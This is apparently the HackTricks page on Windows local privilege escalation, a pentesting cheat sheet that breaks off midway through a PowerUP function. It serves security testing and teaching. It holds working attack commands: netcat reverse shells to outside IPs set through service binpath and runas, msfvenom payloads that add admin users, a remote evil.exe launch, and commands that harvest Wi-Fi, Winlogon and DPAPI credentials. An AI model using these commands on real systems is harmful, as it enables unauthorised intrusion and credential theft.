# Windows Local Privilege Escalation

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)\*\*\*\*

If you want to **know** about my **latest modifications**/**additions**, **join the** [**PEASS & HackTricks telegram group here**](https://t.me/peass)**.**  
If you want to **share some tricks with the community** you can also submit **pull requests** to ****[**https://github.com/carlospolop/hacktricks**](https://github.com/carlospolop/hacktricks) ****that will be reflected in this book.  
Don't forget to **give ⭐ on the github** to motivate me to continue developing this book.

## Initial Windows Theory

### Access Tokens

**If you don't know what are Windows Access Tokens, read the following page before continuing:**

{% page-ref page="access-tokens.md" %}

### ACLs - DACLs/SACLs/ACEs

**If you don't know what is any of the acronyms used in the heading of this section, read the following page before continuing**:

{% page-ref page="acls-dacls-sacls-aces.md" %}

### Integrity Levels

**If you don't know what are integrity levels in Windows you should read the following page before continuing:**

{% page-ref page="integrity-levels.md" %}

## System Info

### Version info enumeration

Check if the Windows version has any known vulnerability \(check also the patches applied\).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

#### On the system

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _\(Winpeas has watson embedded\)_

**Locally with system infromation**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

* \*\*\*\*[https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Any credential/Juicy info saved in the env variables?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```

### PowerShell History

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript files

You can learn how to turn this on in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

### PowerShell Module Logging

It records the pipeline execution details of PowerShell. This includes the commands which are executed including command invocations and some portion of the scripts. It may not have the entire detail of the execution and the output results.  
You can enable this following the link of the last section \(Transcript files\) but enabling "Module Logging" instead of "Powershell Transcription".

```text
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

To view the last 15 events from PowersShell logs you can execute:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell  **Script Block Logging**

It records block of code as they are executed therefore it captures the complete activity and full content of the script. It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. It records all the activity at time of execution thus provides the complete details.

```text
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

The Script Block logging events can be found in Windows Event viewer under following path: _Application and Sevices Logs &gt; Microsoft &gt; Windows &gt; Powershell &gt; Operational_  
To view the last 20 events you can use:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet Settings

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Drives

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

### WSUS

You can compromise the system if the updates are not requested using http**S** but http.

You start by checking if the network uses a non-SSL WSUS update by running the following:

```text
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

If you get a reply such as:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{% file src="../../.gitbook/assets/ctx\_wsuspect\_white\_paper \(1\).pdf" %}

#### WSUS CVE-2020-1013

\*\*\*\*[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).  
Basically, this is the flaw that this bug exploits: 

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) \(once it's liberated\).

## AlwaysInstallElevated

**If** these 2 registers are **enabled** \(value is **0x1**\), then users of any privilege can **install** \(execute\) **`*.msi`** files as NT AUTHORITY\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```

If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:

```text
Write-UserAddMSI
```

Just execute the created binary to escalate privileges.

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools:

{% page-ref page="msi-wrapper.md" %}

### MSI Installation

To execute the **installation** of the **malicious `.msi`** file in **background:**

```text
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_

## Antivirus and Detectors

### Audit Settings

These settings decide what is being **logged**, so you should pay attention

```text
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, is interesting to know where are the logs sent

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** allows you to **manage the local Administrator password** \(which is **randomised**, unique, and **changed regularly**\) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.

```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

When using LAPS, 2 new attributes appear in the computer objects of the domain: _ms-msc-AdmPwd_ and _ms-mcs-AdmPwdExpirationTime._ These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes...

### WDigest

If active, **plain-text passwords are stored in LSASS** \(Local Security Authority Subsystem Service\).  
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).

```text
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

### LSA Protection

Microsoft in **Windows 8.1 and later** has provided additional protection for the LSA to **prevent** untrusted processes from being able to **read its memory** or to inject code.  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).

```text
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```

### Credentials Guard

**Credential Guard** is a new feature in Windows 10 \(Enterprise and Education edition\) that helps to protect your credentials on a machine from threats such as pass the hash.  
****[**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)\*\*\*\*

```text
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```

### Cached Credentials

**Domain credentials** are used by operating system components and are **authenticated** by the **Local** **Security Authority** \(LSA\). Typically, domain credentials are established for a user when a registered security package authenticates the user's logon data.  
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).

```text
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

### AV

Check is there is any anti virus running:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List | more
Get-MpComputerStatus 
```

### AppLocker Policy

Check which files/extensions are blacklisted/whitelisted.

```text
Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

#### Useful Writable folders to bypass AppLocker Policy

```text
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

### UAC

UAC is used to allow an **administrator user to not give administrator privileges to each process executed**. This is **achieved using default** the **low privileged token** of the user.  
[**More information about UAC here**](../authentication-credentials-uac-and-efs.md#uac).

```text
 reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
```

## Users & Groups

### Enumerate Users & Groups

You should check if any of the groups where you belong have interesting permissions

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privileged groups

If you **belongs to some privileged group you may be able to escalate privileges**. Learn about privileged groups and how to abuse them to escalate privileges here:

{% page-ref page="../active-directory-methodology/privileged-accounts-and-token-privileges.md" %}

### Token manipulation

**Learn more** about what is a **token** in this page: [**Windows Tokens**](../authentication-credentials-uac-and-efs.md#access-tokens).  
Check the following page to **learn about interesting tokens** and how to abuse them:

{% page-ref page="privilege-escalation-abusing-tokens.md" %}

### Logged users / Sessions

```text
qwinsta
klist sessions
```

### Home folders

```text
dir C:\Users
Get-ChildItem C:\Users
```

### Password Policy

```text
net accounts
```

### Get the content of the clipboard

```bash
powershell -command "Get-Clipboard"
```

## Running Processes

### File and Folder Permissions

First of all, listing the processes **check for passwords inside the command line of the process**.  
Check if you can **overwrite some binary running** or if you have write permissions of the binary folder to exploit possible [**DLL Hijacking attacks**](dll-hijacking.md):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-unix/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

#### Checking permissions of the processes binaries

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

#### Checking permissions of the folders of the processes binaries \([DLL Hijacking](dll-hijacking.md)\)

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
```

### Memory Password mining

You can create a memory dump of a running process using **procdump** from sysinternals. Services like FTP have the **credentials in clear text in memory**, try to dump the memory and read the credentials.

```text
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Insecure GUI apps

**Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.**

Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt", click on "Click to open Command Prompt"

## Services

Get a list of services:

```text
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

You can use **sc** to get information of a service

```text
sc qc <service_name>
```

It is recommended to have the binary **accesschk** from _Sysinternals_ to check the required privilege level for each service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

It is recommended to check if "Authenticated Users" can modify any service:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Enable service

If you are having this error \(for example with SSDPSRV\): 

_System error 1058 has occurred.  
The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

You can enable it using

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Take into account that the service upnphost depends on SSDPSRV to work \(for XP SP1\)**

**Another workaround** of this problem is running:

```text
sc.exe config usosvc start= auto
```

### **Modify service binary path**

If the group "Authenticated users" has **SERVICE\_ALL\_ACCESS** in a service, then it can modify the binary that is being executed by the service. To modify it and execute **nc** you can do:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Restart service

```text
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Other Permissions can be used to escalate privileges:  
**SERVICE\_CHANGE\_CONFIG** Can reconfigure the service binary  
**WRITE\_DAC:** Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG  
**WRITE\_OWNER:** Can become owner, reconfigure permissions  
**GENERIC\_WRITE:** Inherits SERVICE\_CHANGE\_CONFIG  
**GENERIC\_ALL:** Inherits SERVICE\_CHANGE\_CONFIG

**To detect and exploit** this vulnerability you can use _exploit/windows/local/service\_permissions_

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** or if you have **write permissions on the folder** where the binary is located \([**DLL Hijacking**](dll-hijacking.md)\)**.**  
You can get every binary that is executed by a service using **wmic** \(not in system32\) and check your permissions using **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use **sc** and **icacls**:

```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

### Services registry modify permissions

You should check if you can modify any service registry.  
You can **check** your **permissions** over a service **registry** doing:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if **Authenticated Users** or **NT AUTHORITY\INTERACTIVE** have FullControl. In that case you can change the binary that is going to be executed by the service.

To change the Path of the binary executed:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Services registry AppendData/AddSubdirectory permissions

If you have this permission over a registry this means to **you can create sub registries from this one**. In case of Windows services this is **enough to execute arbitrary code:**

{% page-ref page="appenddata-addsubdirectory-permission-over-service-registry.md" %}



### Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.

For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:

```text
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

To list all unquoted service paths \(minus built-in Windows services\)

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**You can detect and exploit** this vulnerability with metasploit: _exploit/windows/local/trusted\_service\_path_  
You can manually create a service binary with metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

## Applications

### Installed Applications

Check **permissions of the binaries** \(maybe you can overwrite one and escalate privileges\) and of the **folders** \([DLL Hijacking](dll-hijacking.md)\).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

### Write Permissions

Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account \(schedtasks\).

A way to find weak folder/files permissions in the system is doing:

```bash
accesschk.exe /accepteula 
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.  
Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:

{% page-ref page="privilege-escalation-with-autorun-binaries.md" %}

### Drivers

Look for possible **third party weird/vulnerable** drivers

```text
driverquery
driverquery.exe /fo table
driverquery /SI
```

## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

## Network

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Check for other known computers hardcoded on the hosts file

```text
type C:\Windows\System32\drivers\etc\hosts
```

### Network Interfaces & DNS

```text
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Open Ports

Check for **restricted services** from the outside

```bash
netstat -ano #Opened ports?
```

### Routing Table

```text
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Table

```text
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall Rules

\*\*\*\*[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **\(list rules, create rules, turn off, turn off...\)**

More[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux \(wsl\)

```text
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

 Binary `bash.exe` can also be found in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

If you get root user you can listen on any port \(the first time you use `nc.exe` to listen on a port it will ask via GUI if `nc` should be allowed by the firewall\).

```text
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

To easily start bash as root, you can try `--default-user root`

 You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)  
The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **log in the users automaticall**y. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows application that needs credentials to access a resource** \(server or a website\) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Use the `cmdkey` to list the stored credentials on the machine.

```text
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Using `runas` with a provided set of credential.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

In theory, the Data Protection API can enable symmetric encryption of any kind of data; in practice, its primary use in the Windows operating system is to perform symmetric encryption of asymmetric private keys, using a user or system secret as a significant contribution of entropy.

**DPAPI allows developers to encrypt keys using a symmetric key derived from the user's logon secrets**, or in the case of system encryption, using the system's domain authentication secrets.

 The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) of that user. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. \(Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS\).

```text
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

You can use **mimikatz module** `dpapi::masterkey` with the appropriate arguments \(`/pvk` or `/rpc`\) to decrypt it.

The **credentials files protected by the master password** are usually located in:

```text
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.  
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module \(if you are root\).

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

### Saved RDP Connections

You can find them on `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`  
and in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Recently Run Commands

```text
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Remote Desktop Credential Manager**

```text
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**  
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### AppCmd.exe

**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from _**PowerUP**_:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
